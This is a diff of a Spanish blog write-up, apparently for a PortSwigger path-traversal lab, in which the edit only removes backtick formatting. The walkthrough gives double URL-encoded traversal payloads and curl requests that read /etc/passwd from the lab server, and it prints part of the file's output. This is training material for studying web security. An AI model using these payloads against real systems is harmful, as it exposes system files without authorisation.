@@ -24,25 +24,25 @@ image:
   
 ## Descripción
 
-Este `laboratorio` contiene una `vulnerabilidad` de `path traversal` en la `visualización` de `imágenes` de `productos`. La aplicación `bloquea` los `inputs` que contienen la secuencia `../` y los `url decodea` antes de usarlos. Para `resolver` el `laboratorio`, hay que `obtener` el contenido del archivo `/etc/passwd`
+Este laboratorio contiene una vulnerabilidad de path traversal en la visualización de imágenes de productos. La aplicación bloquea los inputs que contienen la secuencia ../ y los url decodea antes de usarlos. Para resolver el laboratorio, hay que obtener el contenido del archivo /etc/passwd
 
 ---
 
 ## Guía de path traversal
 
-`Antes` de `completar` este `laboratorio` es recomendable `leerse` esta `guía de path traversal` [https://justice-reaper.github.io/posts/Path-Traversal-Guide/](https://justice-reaper.github.io/posts/Path-Traversal-Guide/)
+Antes de completar este laboratorio es recomendable leerse esta guía de path traversal [https://justice-reaper.github.io/posts/Path-Traversal-Guide/](https://justice-reaper.github.io/posts/Path-Traversal-Guide/)
 
 ## Resolución
 
-Al `acceder` a la `web` nos sale esto
+Al acceder a la web nos sale esto
 
 ![](/assets/img/Path-Traversal-Lab-4/image_1.png)
 
-Si hacemos `Ctrl + U` vemos como se están `cargando` las `imágenes`
+Si hacemos Ctrl + U vemos como se están cargando las imágenes
 
 ![](/assets/img/Path-Traversal-Lab-4/image_2.png)
 
-En la web de hacktricks [https://book.hacktricks.xyz/pentesting-web/file-inclusion#encoding](https://book.hacktricks.xyz/pentesting-web/file-inclusion#encoding) hay un apartado `Encoding` del cual podemos extraer payload encodedos
+En la web de hacktricks [https://book.hacktricks.xyz/pentesting-web/file-inclusion#encoding](https://book.hacktricks.xyz/pentesting-web/file-inclusion#encoding) hay un apartado Encoding del cual podemos extraer payload encodedos
 
 ```
 http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
@@ -51,7 +51,7 @@ http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
 ```
 
-Probamos un `directory path traversal`
+Probamos un directory path traversal
 
 ```
 # curl 'https://0aab0027034fa53480d27189009d0038.web-security-academy.net/image?filename=..%252f..%252f..%252fetc%252fpasswd'          
@@ -98,7 +98,7 @@ pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
 gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
 ```
 
-Si lo queremos hacerlo desde la `web` debemos poner `view-source://`
+Si lo queremos hacerlo desde la web debemos poner view-source://
 
 ```
 view-source:https://0aab0027034fa53480d27189009d0038.web-security-academy.net/image?filename=..%252f..%252f..%252fetc%252fpasswd
@@ -106,7 +106,7 @@ view-source:https://0aab0027034fa53480d27189009d0038.web-security-academy.net/im
 
 ![](/assets/img/Path-Traversal-Lab-4/image_3.png)
 
-Otra opción sería `capturar` la `petición` que se da al cargar una imagen `https://0aab0027034fa53480d27189009d0038.web-security-academy.net/image?filename=54.jpg` con el `Burpsuite` y `encodear` el `input` de `filename` dos veces. Podemos `urlencodear` todos los `caracteres` o solo `barras`, solo `puntos` u `ambas`
+Otra opción sería capturar la petición que se da al cargar una imagen https://0aab0027034fa53480d27189009d0038.web-security-academy.net/image?filename=54.jpg con el Burpsuite y encodear el input de filename dos veces. Podemos urlencodear todos los caracteres o solo barras, solo puntos u ambas
 
 ```
 # curl 'https://0aab0027034fa53480d27189009d0038.web-security-academy.net/image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34'            
